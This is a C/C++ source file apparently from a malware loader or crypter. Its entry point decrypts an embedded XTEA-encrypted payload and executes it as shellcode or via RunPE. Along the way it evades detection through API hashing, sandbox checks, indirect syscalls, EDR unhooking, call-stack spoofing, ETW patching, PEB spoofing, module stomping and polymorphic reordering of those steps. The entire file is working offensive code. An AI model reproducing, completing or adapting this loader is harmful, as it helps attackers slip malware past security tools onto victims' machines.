#include <Windows.h>
#include "Common.h"
#include "ApiHashing.h"
#include "Payload.h"
#include "Opsec.h"
#include "..\Engine\NtApi.h"
#include "..\Engine\RunPE.h"
#include "..\Engine\OpsecFlags.h"
#include "Syscalls.h"
#include "StackSpoof.h"
#include "ModuleStomping.h"
#include "Evasion.h"
#include "..\Engine\Xtea.h"
#include "Unhooker.h"

#ifndef POLY_VARIANT
#define POLY_VARIANT 0
#endif

extern "C" {
    BOOL InitNtApi(void);
    void PolyIslands_Touch(void);
}

typedef LPVOID   (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *pfnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef VOID     (WINAPI *pfnExitProcess)(UINT);
typedef VOID     (WINAPI *pfnExitThread_t)(DWORD);
typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

#define RESOLVE_API(TYPE, HMOD, HASH) ((TYPE)GetProcAddressH(HMOD, HASH))

typedef struct _LOADER_CTX {
    HMODULE         hKernel32;
    pfnExitProcess  pExitProcess;
    pfnVirtualAlloc pVirtualAlloc;
    pfnVirtualFree  pVirtualFree;

    PBYTE  pEncryptedPayload;
    DWORD  payloadSize;
    DWORD  mutatedStubSize;
    DWORD  origDecompSize;
    DWORD  key_salt[4];
    BYTE   dll_indices[3];
    DWORD  exportHash;
    DWORD  exportSeed;
    LPCSTR pExportArg;
    LPCSTR pSpoofExe;
    LPCSTR pSemaphoreName;
    DWORD  sleepFwdMs;
    DWORD  uptimeMin;
    DWORD  hammerMs;
    DWORD  opsecFlags;

    DWORD  dwProtectSsn;
    PVOID  pProtectTrampoline;
    BYTE*  pDecompressedPE;
} LOADER_CTX;

static void Loader_Die(LOADER_CTX* ctx, UINT code) {
    if (ctx && ctx->pExitProcess) ctx->pExitProcess(LOADER_EXIT(code));
}

static BOOL Loader_InitApis(LOADER_CTX* ctx) {
    ApiHashing_InitHashes();

    ctx->hKernel32 = GetModuleHandleH(g_Hash_kernel32);
    if (!ctx->hKernel32) return FALSE;

#if POLY_VARIANT == 3
    ctx->pVirtualFree  = RESOLVE_API(pfnVirtualFree,  ctx->hKernel32, g_Hash_VirtualFree);
    ctx->pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, ctx->hKernel32, g_Hash_VirtualAlloc);
    ctx->pExitProcess  = RESOLVE_API(pfnExitProcess,  ctx->hKernel32, g_Hash_ExitProcess);
#else
    ctx->pExitProcess  = RESOLVE_API(pfnExitProcess,  ctx->hKernel32, g_Hash_ExitProcess);
    ctx->pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, ctx->hKernel32, g_Hash_VirtualAlloc);
    ctx->pVirtualFree  = RESOLVE_API(pfnVirtualFree,  ctx->hKernel32, g_Hash_VirtualFree);
#endif

    if (!ctx->pExitProcess || !ctx->pVirtualAlloc || !ctx->pVirtualFree) return FALSE;
    return TRUE;
}

static BOOL Loader_LoadPayload(LOADER_CTX* ctx, DWORD* pdwErr) {
    return GetPayloadFromResource(&ctx->pEncryptedPayload, &ctx->payloadSize,
                                  &ctx->mutatedStubSize, &ctx->origDecompSize,
                                  ctx->key_salt, ctx->dll_indices, &ctx->exportHash,
                                  &ctx->pExportArg, &ctx->pSpoofExe, &ctx->pSemaphoreName,
                                  &ctx->sleepFwdMs, &ctx->uptimeMin, &ctx->hammerMs,
                                  &ctx->opsecFlags, pdwErr);
}

static void Loader_Evasion(LOADER_CTX* ctx) {
    Evasion_HammerDelay(ctx->hammerMs ? ctx->hammerMs : 3000, ctx->opsecFlags);
    if (Evasion_RunChecks(ctx->opsecFlags, ctx->pSemaphoreName, ctx->sleepFwdMs, ctx->uptimeMin))
        ctx->pExitProcess(0);
}

static DWORD Loader_InitSyscalls(LOADER_CTX* ctx) {
    (void)ctx;
    if (!Syscalls_Init()) return 29;
    if (!InitNtApi()) return 30;
    return 0;
}

static void Loader_Unhook(LOADER_CTX* ctx) {
    if (ctx->opsecFlags & OPSEC_FLAG_UNHOOK)
        Unhook_RestoreAll();
}

static BOOL Loader_InitSpoof(LOADER_CTX* ctx) {
    if (ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK) return TRUE;
    if (!StackSpoof_Init()) {
        Loader_Die(ctx, 40 + g_SpoofInitFailStep);
        return FALSE;
    }
    return TRUE;
}

static BOOL Loader_PatchEtw(LOADER_CTX* ctx) {
    if (ctx->opsecFlags & OPSEC_FLAG_NO_ETW) return TRUE;
    if (!Opsec_PatchEtw()) {
        Loader_Die(ctx, 60 + g_EtwFailStep);
        return FALSE;
    }
    return TRUE;
}

static void Loader_DecryptXtea(LOADER_CTX* ctx) {
    DWORD xteaKey[4];
    Xtea_DeriveKey(xteaKey, ctx->key_salt);
    Xtea_Crypt(ctx->pEncryptedPayload, ctx->payloadSize, xteaKey);

    ctx->exportSeed = ctx->key_salt[0];
    xteaKey[0] = xteaKey[1] = xteaKey[2] = xteaKey[3] = 0;
    ctx->key_salt[0] = ctx->key_salt[1] = ctx->key_salt[2] = ctx->key_salt[3] = 0;
}

static void Loader_SpoofPeb(LOADER_CTX* ctx) {
    if (ctx->opsecFlags & OPSEC_FLAG_NO_PEB) return;

    static const BYTE kPrefixEnc[] = {
        0x25,0x5C,0x3A,0x31,0x0F,0x08,0x02,0x09,
        0x11,0x15,0x3A,0x35,0x1F,0x15,0x12,0x03,
        0x0B,0x55,0x54,0x3A
    };
    WCHAR spoofPathW[80];
    int   wpi = 0;
    for (int ii = 0; ii < 20; ii++) spoofPathW[wpi++] = (WCHAR)(kPrefixEnc[ii] ^ 0x66u);
    if (ctx->pSpoofExe) {
        const char* pNameA = ctx->pSpoofExe;
        while (*pNameA && wpi < 79) { spoofPathW[wpi++] = (WCHAR)(unsigned char)*pNameA++; }
    }
    spoofPathW[wpi] = L'\0';
    Opsec_SpoofPeb(spoofPathW);
}

/* POLY_VARIANT reorders independent OPSEC steps. MUST constraints preserved:
 *   Unhook/Spoof/ETW after InitNtApi; Spoof before spoofed Nt* preferred;
 *   XTEA before stomp; PEB after resource (always). */
static void Loader_OpsecPhase(LOADER_CTX* ctx) {
#if POLY_VARIANT == 1
    /* Spoof → Unhook → XTEA → PEB → ETW */
    if (!Loader_InitSpoof(ctx)) return;
    Loader_Unhook(ctx);
    Loader_DecryptXtea(ctx);
    Loader_SpoofPeb(ctx);
    if (!Loader_PatchEtw(ctx)) return;
#elif POLY_VARIANT == 2
    /* Unhook → Spoof → PEB → XTEA → ETW */
    Loader_Unhook(ctx);
    if (!Loader_InitSpoof(ctx)) return;
    Loader_SpoofPeb(ctx);
    Loader_DecryptXtea(ctx);
    if (!Loader_PatchEtw(ctx)) return;
#elif POLY_VARIANT == 3
    /* Spoof → ETW → Unhook → XTEA → PEB */
    if (!Loader_InitSpoof(ctx)) return;
    if (!Loader_PatchEtw(ctx)) return;
    Loader_Unhook(ctx);
    Loader_DecryptXtea(ctx);
    Loader_SpoofPeb(ctx);
#else
    /* V0 baseline: Unhook → Spoof → ETW → XTEA → PEB */
    Loader_Unhook(ctx);
    if (!Loader_InitSpoof(ctx)) return;
    if (!Loader_PatchEtw(ctx)) return;
    Loader_DecryptXtea(ctx);
    Loader_SpoofPeb(ctx);
#endif
}

static BOOL Loader_DecryptExec(LOADER_CTX* ctx) {
    PVOID  pOriginalDllBytes    = NULL;
    SIZE_T originalDllBytesSize = 0;
    PVOID  pOverloadViewBase    = NULL;

    PVOID execBuf;
    if (ctx->opsecFlags & OPSEC_FLAG_MODULE_OVERLOAD) {
        execBuf = ModuleOverload_Alloc(ctx->payloadSize, ctx->dll_indices,
                                       &pOriginalDllBytes, &originalDllBytesSize,
                                       &pOverloadViewBase);
    } else {
        execBuf = ModuleStomp_Alloc(ctx->payloadSize, ctx->dll_indices,
                                    &pOriginalDllBytes, &originalDllBytesSize);
    }

    custom_memset(ctx->dll_indices, 0, sizeof(ctx->dll_indices));

    if (!execBuf) {
        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
        Loader_Die(ctx, 33);
        return FALSE;
    }

    custom_memcpy(execBuf, ctx->pEncryptedPayload, ctx->mutatedStubSize);

    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory,
                                  &ctx->dwProtectSsn, &ctx->pProtectTrampoline)) {
        custom_memset(execBuf, 0, ctx->payloadSize);
        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
        Loader_Die(ctx, 34);
        return FALSE;
    }

    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;

    ULONG  dwOldProtect = 0;
    SIZE_T regionSize   = (SIZE_T)ctx->mutatedStubSize;

    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
    NTSTATUS status = pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_EXECUTE_READ, &dwOldProtect);
    if (!NT_SUCCESS(status)) {
        custom_memset(execBuf, 0, ctx->payloadSize);
        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
        Loader_Die(ctx, 34);
        return FALSE;
    }

    PBYTE pCompressedPayload = ctx->pEncryptedPayload + ctx->mutatedStubSize;
    typedef void (*DecryptFn_t)(PBYTE pPayload);
    ((DecryptFn_t)execBuf)(pCompressedPayload);

    regionSize = ctx->payloadSize;
    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
    pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_READWRITE, &dwOldProtect);

    DWORD compressedSize = ctx->payloadSize - ctx->mutatedStubSize;
    ctx->pDecompressedPE = NULL;
    if (!DecompressPayload(pCompressedPayload, compressedSize,
                           &ctx->pDecompressedPE, ctx->origDecompSize)) {
        custom_memset(execBuf, 0, ctx->payloadSize);
        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
        Loader_Die(ctx, 34);
        return FALSE;
    }

    custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
    ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
    ctx->pEncryptedPayload = NULL;

    custom_memset(execBuf, 0, ctx->payloadSize);

    if (pOriginalDllBytes && originalDllBytesSize) {
        custom_memcpy(execBuf, pOriginalDllBytes, originalDllBytesSize);

        SIZE_T restoreSize  = originalDllBytesSize;
        PVOID  pRestoreBase = execBuf;
        SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
        pNtProtect((HANDLE)-1, &pRestoreBase, &restoreSize, PAGE_EXECUTE_READ, &dwOldProtect);

        ctx->pVirtualFree(pOriginalDllBytes, 0, MEM_RELEASE);
    }

    if (pOverloadViewBase)
        pNtUnmapViewOfSection((HANDLE)-1, pOverloadViewBase);

    return TRUE;
}

static void Loader_RunPayload(LOADER_CTX* ctx) {
    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;
    ULONG dwOldProtect = 0;
    NTSTATUS status;

    if (ctx->opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE) {
        SIZE_T scSize  = (SIZE_T)ctx->origDecompSize;
        PVOID  pScBase = ctx->pDecompressedPE;
        SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
        status = pNtProtect((HANDLE)-1, &pScBase, &scSize, PAGE_EXECUTE_READ, &dwOldProtect);
        if (!NT_SUCCESS(status)) {
            custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
            ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
            Loader_Die(ctx, 36);
            return;
        }

        if (!(ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) StackSpoof_Cleanup();

        void (*pShellcode)(void) = (void (*)(void))ctx->pDecompressedPE;
        pShellcode();

        /* RAW keep-alive: park loader thread — do not wipe buffer (stager workers). */
        if (ctx->opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
            typedef VOID (WINAPI *pfnSleep_t)(DWORD);
            pfnSleep_t pSleep = (pfnSleep_t)GetProcAddressH(ctx->hKernel32, g_Hash_Sleep);
            if (pSleep) {
                for (;;) pSleep(0xFFFFFFFF);
            }
        }

        custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
        ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
    } else {
        void (*pPreExec)(void) = (ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK)
                                     ? NULL : StackSpoof_Cleanup;
        DWORD runPeRes = RunPE(ctx->pDecompressedPE, ctx->exportHash, ctx->exportSeed,
                               ctx->pExportArg, pPreExec);

        custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
        ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);

        if (runPeRes != 0) {
            Loader_Die(ctx, runPeRes);
            return;
        }
    }

    if (ctx->opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
        pfnExitThread_t pExitThread =
            (pfnExitThread_t)GetProcAddressH(ctx->hKernel32, g_Hash_ExitThread);
        if (pExitThread) pExitThread(0);
    }
    Loader_Die(ctx, 777);
}

extern "C" int EntryPoint() {
    LOADER_CTX ctx;
    custom_memset(&ctx, 0, sizeof(ctx));

    /* Keep mutation islands in the binary (no runtime effect). */
    PolyIslands_Touch();

    if (!Loader_InitApis(&ctx))
        return (int)LOADER_EXIT(ctx.pExitProcess ? 22 : 1);

    DWORD dwExtractionError = 0;
    if (!Loader_LoadPayload(&ctx, &dwExtractionError))
        Loader_Die(&ctx, dwExtractionError);

    Loader_Evasion(&ctx);

    {
        DWORD scErr = Loader_InitSyscalls(&ctx);
        if (scErr) Loader_Die(&ctx, scErr);
    }

    Loader_OpsecPhase(&ctx);

    if (!Loader_DecryptExec(&ctx))
        return (int)LOADER_EXIT(34);

    Loader_RunPayload(&ctx);
    return (int)LOADER_EXIT(777);
}
